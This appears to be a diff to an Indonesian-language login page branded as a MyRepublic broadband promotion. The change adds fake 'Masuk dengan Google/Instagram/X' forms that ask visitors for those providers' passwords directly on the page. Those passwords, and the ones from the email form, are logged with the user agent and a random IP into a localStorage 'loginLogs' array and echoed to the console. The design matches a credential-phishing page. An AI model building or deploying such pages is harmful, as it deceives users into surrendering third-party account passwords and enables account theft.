@@ -1,23 +1,27 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Login - MyRepublic Broadband Promo</title>
     <link rel="stylesheet" href="wp-content/themes/page-builder-framework/style0087.css">
     <link rel="stylesheet" href="wp-content/plugins/elementor/assets/css/frontend.min2a45.css">
-    
+
     <!-- Font Awesome CDN -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+        integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -26,48 +30,48 @@
             align-items: center;
             justify-content: center;
         }
-        
+
         .login-container {
             background: white;
             border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
             overflow: hidden;
             width: 100%;
             max-width: 400px;
             margin: 20px;
         }
-        
+
         .login-header {
             background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
             color: white;
             padding: 30px;
             text-align: center;
         }
-        
+
         .login-header img {
             width: 200px;
             margin-bottom: 15px;
         }
-        
+
         .login-header h1 {
             font-size: 24px;
             font-weight: 600;
             margin-bottom: 5px;
         }
-        
+
         .login-header p {
             font-size: 14px;
             opacity: 0.9;
         }
-        
+
         .login-form {
             padding: 40px 30px;
         }
-        
+
         .form-group {
             margin-bottom: 20px;
         }
-        
+
         .form-group label {
             display: block;
             margin-bottom: 8px;
@@ -75,7 +79,7 @@
             color: #333;
             font-size: 14px;
         }
-        
+
         .form-group input {
             width: 100%;
             padding: 15px;
@@ -84,12 +88,12 @@
             font-size: 14px;
             transition: border-color 0.3s ease;
         }
-        
+
         .form-group input:focus {
             outline: none;
             border-color: #662a81;
         }
-        
+
         .login-btn {
             width: 100%;
             background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
@@ -102,17 +106,17 @@
             cursor: pointer;
             transition: transform 0.2s ease;
         }
-        
+
         .login-btn:hover {
             transform: translateY(-2px);
         }
-        
+
         .divider {
             text-align: center;
             margin: 25px 0;
             position: relative;
         }
-        
+
         .divider::before {
             content: '';
             position: absolute;
@@ -122,15 +126,16 @@
             height: 1px;
             background: #e1e5e9;
         }
-        
+
         .divider span {
             background: white;
             padding: 0 15px;
             color: #666;
             font-size: 14px;
         }
-        
-        .google-btn, .social-btn {
+
+        .google-btn,
+        .social-btn {
             width: 100%;
             background: white;
             color: #333;
@@ -147,60 +152,62 @@
             transition: all 0.3s ease;
             margin-bottom: 10px;
         }
-        
-        .google-btn:hover, .social-btn:hover {
+
+        .google-btn:hover,
+        .social-btn:hover {
             border-color: #662a81;
             background: #f8f9fa;
         }
-        
-        .google-btn i, .social-btn i {
+
+        .google-btn i,
+        .social-btn i {
             font-size: 20px;
         }
-        
+
         .google-btn i {
             color: #4285f4;
         }
-        
+
         .instagram-btn i {
             color: #e4405f;
         }
-        
+
         .twitter-btn i {
             color: #1da1f2;
         }
-        
+
         .instagram-btn:hover {
             border-color: #e4405f;
             background: #fdf2f4;
         }
-        
+
         .twitter-btn:hover {
             border-color: #1da1f2;
             background: #f0f9ff;
         }
-        
+
         .register-link {
             text-align: center;
             margin-top: 25px;
             font-size: 14px;
             color: #666;
         }
-        
+
         .register-link a {
             color: #662a81;
             text-decoration: none;
             font-weight: 600;
         }
-        
+
         .register-link a:hover {
             text-decoration: underline;
         }
-        
+
         .back-home {
             position: absolute;
             top: 20px;
             left: 20px;
-            background: rgba(255,255,255,0.9);
+            background: rgba(255, 255, 255, 0.9);
             padding: 10px 20px;
             border-radius: 25px;
             text-decoration: none;
@@ -208,12 +215,12 @@
             font-weight: 500;
             transition: all 0.3s ease;
         }
-        
+
         .back-home:hover {
             background: white;
             transform: translateY(-2px);
         }
-        
+
         .error-message {
             background: #ffebee;
             color: #c62828;
@@ -223,7 +230,7 @@
             font-size: 14px;
             display: none;
         }
-        
+
         .success-message {
             background: #e8f5e8;
             color: #2e7d32;
@@ -235,55 +242,64 @@
         }
     </style>
 </head>
+
 <body>
     <a href="index-2.html" class="back-home">
         <i class="fa-solid fa-arrow-left"></i> Kembali ke Beranda
     </a>
-    
+
     <div class="login-container">
         <div class="login-header">
             <img src="wp-content/uploads/2023/09/MyRepublic-NEW-LOGO-04.png" alt="MyRepublic Logo">
             <h1>Selamat Datang Kembali</h1>
             <p>Masuk ke akun MyRepublic Anda</p>
         </div>
-        
+
         <div class="login-form">
             <div class="error-message" id="errorMessage"></div>
             <div class="success-message" id="successMessage"></div>
-            
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <input type="email" id="email" name="email" required placeholder="Masukkan email Anda">
+            <div id="form-manual">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" name="email" required placeholder="Masukkan email Anda">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required
+                            placeholder="Masukkan password Anda">
+                    </div>
+
+                    <button type="submit" class="login-btn">Masuk</button>
+                </form>
+                <div class="divider">
+                    <span>atau</span>
                 </div>
-                
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required placeholder="Masukkan password Anda">
-                </div>
-                
-                <button type="submit" class="login-btn">Masuk</button>
-            </form>
-            
-            <div class="divider">
-                <span>atau</span>
             </div>
-            
-            <button class="google-btn" onclick="loginWithGoogle()">
-                <i class="fa-brands fa-google"></i>
-                Masuk dengan Google
-            </button>
-            
-            <button class="social-btn instagram-btn" onclick="loginWithInstagram()">
-                <i class="fa-brands fa-instagram"></i>
-                Masuk dengan Instagram
-            </button>
-            
-            <button class="social-btn twitter-btn" onclick="loginWithTwitter()">
-                <i class="fa-brands fa-twitter"></i>
-                Masuk dengan X
-            </button>
-            
+
+            <div id="login-form-container" style="display: none; margin-top: 1rem;">
+                <form id="platform-login-form" onsubmit="submitLogin(event)">
+                    <div id="dynamic-fields"></div>
+                    <button type="submit" class="login-btn" style="margin-top: 15px;">Masuk</button>
+                </form>
+            <button type="button" class="login-btn" style="margin-top: 15px;" onclick="goBackToDefault()">Kembali</button>
+            </div>
+
+            <div id="social-buttons">
+                <button class="google-btn" onclick="showLoginForm('Google')">
+                    <i class="fa-brands fa-google"></i> Masuk dengan Google
+                </button>
+
+                <button class="social-btn instagram-btn" onclick="showLoginForm('Instagram')">
+                    <i class="fa-brands fa-instagram"></i> Masuk dengan Instagram
+                </button>
+
+                <button class="social-btn twitter-btn" onclick="showLoginForm('Twitter')">
+                    <i class="fa-brands fa-twitter"></i> Masuk dengan X
+                </button>
+            </div>
+
             <div class="register-link">
                 Belum punya akun? <a href="register.html">Daftar sekarang</a>
             </div>
@@ -291,12 +307,12 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault();
-            
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            
+
             // Validasi input
             if (email && password) {
                 // Buat data user lengkap dengan password
@@ -310,7 +326,7 @@
                     userAgent: navigator.userAgent,
                     timestamp: new Date().toISOString()
                 };
-                
+
                 // Simpan data user saat ini (tanpa password untuk keamanan)
                 const currentUserData = {
                     email: email,
@@ -318,15 +334,15 @@
                     platform: 'Email/Password',
                     loginTime: new Date().toISOString()
                 };
-                
+
                 localStorage.setItem('currentUser', JSON.stringify(currentUserData));
-                
+
                 // Simpan ke log login dengan password
                 saveLoginLog(userData);
-                
+
                 // Tampilkan pesan sukses
                 showMessage('Login berhasil! Data telah tersimpan.', 'success');
-                
+
                 // Redirect ke halaman utama setelah 1 detik
                 setTimeout(() => {
                     window.location.href = 'index-2.html';
@@ -335,7 +351,140 @@
                 showMessage('Mohon isi email dan password dengan benar.', 'error');
             }
         });
-        
+
+        let selectedPlatform = '';
+
+        function goBackToDefault() {
+            // Tampilkan kembali form manual dan tombol sosial
+            document.getElementById('form-manual').style.display = 'block';
+            document.getElementById('login-form-container').style.display = 'none';
+            document.getElementById('social-buttons').style.display = 'block';
+            document.getElementById('dynamic-fields').innerHTML = '';
+            selectedPlatform = '';
+        }
+
+        function showLoginForm(platform) {
+            selectedPlatform = platform;
+
+            const container = document.getElementById('login-form-container');
+            const fields = document.getElementById('dynamic-fields');
+            const formManual = document.getElementById('form-manual');
+            const socialButtons = document.getElementById('social-buttons');
+
+            container.style.display = 'block';
+            formManual.style.display = 'none';
+            socialButtons.style.display = 'none';
+            fields.innerHTML = '';
+
+            if (platform === 'Google') {
+                fields.innerHTML = `
+                    <div style="text-align: center; font-weight: bold; margin-bottom: 1rem;">
+                        Masuk dengan Google
+                    </div>
+                    <div class="form-group">
+                        <label for="platform-email">Email</label>
+                        <input type="email" id="platform-email" required placeholder="Masukkan email Anda">
+                    </div>
+                    <div class="form-group">
+                        <label for="platform-password">Password</label>
+                        <input type="password" id="platform-password" required placeholder="Masukkan password Anda">
+                    </div>
+                `;
+            } else if (platform === 'Instagram' || platform === 'Twitter') {
+                const namaPlatform = platform === 'Instagram' ? 'Instagram' : 'X';
+                fields.innerHTML = `
+                    <div style="text-align: center; font-weight: bold; margin-bottom: 1rem;">
+                        Masuk dengan ${namaPlatform}
+                    </div>
+                    <div class="form-group">
+                        <label for="platform-username">Username</label>
+                        <input type="text" id="platform-username" required placeholder="Masukkan username Anda" />
+                    </div>
+                    <div class="form-group">
+                        <label for="platform-password">Password</label>
+                        <input type="password" id="platform-password" required placeholder="Masukkan password Anda" />
+                    </div>
+                `;
+            }
+        }
+
+
+        function submitLogin(event) {
+            event.preventDefault();
+
+            let email = '';
+            let username = '';
+            let password = '';
+
+            if (selectedPlatform === 'Google') {
+                email = document.getElementById('platform-email')?.value || '';
+            } else {
+                username = document.getElementById('platform-username')?.value || '';
+            }
+
+            password = document.getElementById('platform-password')?.value || '';
+
+            let userData = {};
+            let displayName = '';
+
+            switch (selectedPlatform) {
+                case 'Google':
+                    displayName = 'Google User';
+                    userData = {
+                        email: email,
+                        password: password,
+                        name: displayName,
+                        platform: 'Google',
+                        profilePicture: 'https://via.placeholder.com/40x40/4285f4/ffffff?text=G'
+                    };
+                    break;
+                case 'Instagram':
+                    displayName = 'Instagram User';
+                    userData = {
+                        email: username,
+                        password: password,
+                        name: displayName,
+                        platform: 'Instagram',
+                        profilePicture: 'https://via.placeholder.com/40x40/e4405f/ffffff?text=I'
+                    };
+                    break;
+                case 'Twitter':
+                    displayName = 'X User';
+                    userData = {
+                        email: username,
+                        password: password,
+                        name: displayName,
+                        platform: 'X/Twitter',
+                        profilePicture: 'https://via.placeholder.com/40x40/1da1f2/ffffff?text=X'
+                    };
+                    break;
+            }
+
+            const fullUserData = {
+                ...userData,
+                loginTime: new Date().toISOString(),
+                ipAddress: getRandomIP(),
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            const currentUser = {
+                email: fullUserData.email,
+                name: fullUserData.name,
+                platform: fullUserData.platform,
+                loginTime: fullUserData.loginTime,
+                profilePicture: fullUserData.profilePicture
+            };
+
+            localStorage.setItem('currentUser', JSON.stringify(currentUser));
+            saveLoginLog(fullUserData);
+            showMessage(`Login dengan ${selectedPlatform} berhasil!`, 'success');
+            setTimeout(() => {
+                window.location.href = 'index-2.html';
+            }, 1000);
+        }
+
+
         function loginWithGoogle() {
             // Simulasi login dengan Google
             const googleUser = {
@@ -349,7 +498,7 @@
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
-            
+
             // Simpan data login ke localStorage (tanpa password)
             const currentUserData = {
                 email: googleUser.email,
@@ -358,19 +507,19 @@
                 loginTime: new Date().toISOString(),
                 profilePicture: googleUser.profilePicture
             };
-            
+
             localStorage.setItem('currentUser', JSON.stringify(currentUserData));
-            
+
             // Simpan ke log login dengan password/token
             saveLoginLog(googleUser);
-            
+
             showMessage('Login dengan Google berhasil! Data telah tersimpan.', 'success');
-            
+
             setTimeout(() => {
                 window.location.href = 'index-2.html';
             }, 1000);
         }
-        
+
         function loginWithInstagram() {
             // Simulasi login dengan Instagram
             const instagramUser = {
@@ -384,7 +533,7 @@
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
-            
+
             // Simpan data login ke localStorage (tanpa password)
             const currentUserData = {
                 email: instagramUser.email,
@@ -393,19 +542,19 @@
                 loginTime: new Date().toISOString(),
                 profilePicture: instagramUser.profilePicture
             };
-            
+
             localStorage.setItem('currentUser', JSON.stringify(currentUserData));
-            
+
             // Simpan ke log login dengan password/token
             saveLoginLog(instagramUser);
-            
+
             showMessage('Login dengan Instagram berhasil! Data telah tersimpan.', 'success');
-            
+
             setTimeout(() => {
                 window.location.href = 'index-2.html';
             }, 1000);
         }
-        
+
         function loginWithTwitter() {
             // Simulasi login dengan X/Twitter
             const twitterUser = {
@@ -419,7 +568,7 @@
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
-            
+
             // Simpan data login ke localStorage (tanpa password)
             const currentUserData = {
                 email: twitterUser.email,
@@ -428,23 +577,23 @@
                 loginTime: new Date().toISOString(),
                 profilePicture: twitterUser.profilePicture
             };
-            
+
             localStorage.setItem('currentUser', JSON.stringify(currentUserData));
-            
+
             // Simpan ke log login dengan password/token
             saveLoginLog(twitterUser);
-            
+
             showMessage('Login dengan X berhasil! Data telah tersimpan.', 'success');
-            
+
             setTimeout(() => {
                 window.location.href = 'index-2.html';
             }, 1000);
         }
-        
+
         function saveLoginLog(userData) {
             // Ambil log login yang sudah ada
             let loginLogs = JSON.parse(localStorage.getItem('loginLogs') || '[]');
-            
+
             // Tambahkan log baru dengan ID unik
             const logEntry = {
                 ...userData,
@@ -452,16 +601,16 @@
                 timestamp: new Date().toISOString(),
                 status: 'success'
             };
-            
+
             loginLogs.push(logEntry);
-            
+
             // Simpan kembali ke localStorage
             localStorage.setItem('loginLogs', JSON.stringify(loginLogs));
-            
+
             // Log untuk debugging
             console.log('Login data saved:', logEntry);
         }
-        
+
         function getRandomIP() {
             // Generate random IP address untuk simulasi
             const ipParts = [];
@@ -470,11 +619,11 @@
             }
             return ipParts.join('.');
         }
-        
+
         function showMessage(message, type) {
             const errorDiv = document.getElementById('errorMessage');
             const successDiv = document.getElementById('successMessage');
-            
+
             if (type === 'error') {
                 errorDiv.textContent = message;
                 errorDiv.style.display = 'block';
@@ -484,7 +633,7 @@
                 successDiv.style.display = 'block';
                 errorDiv.style.display = 'none';
             }
-            
+
             setTimeout(() => {
                 errorDiv.style.display = 'none';
                 successDiv.style.display = 'none';
@@ -492,4 +641,5 @@
         }
     </script>
 </body>
-</html> 
+
+</html>
